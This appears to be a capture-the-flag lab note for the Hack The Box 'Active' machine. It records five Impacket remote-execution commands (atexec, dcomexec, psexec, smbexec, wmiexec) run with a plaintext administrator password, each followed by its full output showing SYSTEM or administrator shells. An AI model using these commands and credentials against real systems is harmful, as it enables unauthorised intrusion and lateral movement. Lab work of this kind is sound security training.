## exec
### atexec
```sh
└─$ impacket-atexec -ts 'active.htb/administrator:Ticketmaster1968@10.129.172.255' whoami -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 09:17:21] [!] This will work ONLY on Windows >= Vista
[2025-07-28 09:17:21] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 09:17:25] [*] Creating task \EDdbKsEL
[2025-07-28 09:17:26] [*] Running task \EDdbKsEL
[2025-07-28 09:17:27] [+] Calling SchRpcGetLastRunInfo for \EDdbKsEL
[2025-07-28 09:17:27] [*] Deleting task \EDdbKsEL
[2025-07-28 09:17:28] [*] Attempting to read ADMIN$\Temp\EDdbKsEL.tmp
nt authority\system

[2025-07-28 09:17:30] [+] Deleting file ADMIN$\Temp\EDdbKsEL.tmp
```
### dcomexec
```sh
└─$ impacket-dcomexec -share 'C$' -ts -object 'MMC20' -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 09:12:29] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 09:12:31] [*] SMBv2.1 dialect used
[2025-07-28 09:12:33] [+] Target system is 10.129.172.255 and isFQDN is False
[2025-07-28 09:12:33] [+] StringBinding: DC[51092]
[2025-07-28 09:12:33] [+] StringBinding: 10.129.172.255[51092]
[2025-07-28 09:12:33] [+] StringBinding chosen: ncacn_ip_tcp:10.129.172.255[51092]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
active\administrator

C:\>exit
```
### psexec
```sh
└─$ impacket-psexec -ts 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:15:11] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:15:11] [+] StringBinding ncacn_np:10.129.172.255[\pipe\svcctl]
[2025-07-28 08:15:14] [*] Requesting shares on 10.129.172.255.....
[2025-07-28 08:15:17] [*] Found writable share ADMIN$
[2025-07-28 08:15:17] [*] Uploading file ISoEJWvP.exe
[2025-07-28 08:15:20] [*] Opening SVCManager on 10.129.172.255.....
[2025-07-28 08:15:22] [*] Creating service CEiG on 10.129.172.255.....
[2025-07-28 08:15:23] [*] Starting service CEiG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> exit
[2025-07-28 08:17:19] [*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[2025-07-28 08:17:19] [*] Opening SVCManager on 10.129.172.255.....
[2025-07-28 08:17:21] [*] Stopping service CEiG.....
[2025-07-28 08:17:22] [*] Removing service CEiG.....
[2025-07-28 08:17:28] [*] Removing file ISoEJWvP.exe.....
```
### smbexec
```sh
└─$ impacket-smbexec -share 'C$' -ts -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:18:09] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:18:09] [+] StringBinding ncacn_np:10.129.172.255[\pipe\svcctl]
[2025-07-28 08:18:13] [+] Executing %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\BpZcNLCs.bat & %COMSPEC% /Q /c %SYSTEMROOT%\BpZcNLCs.bat & del %SYSTEMROOT%\BpZcNLCs.bat
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32>whoami
[2025-07-28 08:18:30] [+] Executing %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\TQtkUbvS.bat & %COMSPEC% /Q /c %SYSTEMROOT%\TQtkUbvS.bat & del %SYSTEMROOT%\TQtkUbvS.bat
nt authority\system

C:\Windows\system32>exit
```
### wmiexec
```sh
└─$ impacket-wmiexec -share 'C$' -ts -shell-type 'cmd' 'active.htb/administrator:Ticketmaster1968@10.129.172.255' -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[2025-07-28 08:13:20] [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[2025-07-28 08:13:23] [*] SMBv2.1 dialect used
[2025-07-28 08:13:25] [+] Target system is 10.129.172.255 and isFQDN is False
[2025-07-28 08:13:25] [+] StringBinding: \\\\DC[\\PIPE\\atsvc]
[2025-07-28 08:13:25] [+] StringBinding: DC[49154]
[2025-07-28 08:13:25] [+] StringBinding: 10.129.172.255[49154]
[2025-07-28 08:13:25] [+] StringBinding chosen: ncacn_ip_tcp:10.129.172.255[49154]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>whoami
active\administrator

C:\>exit
```
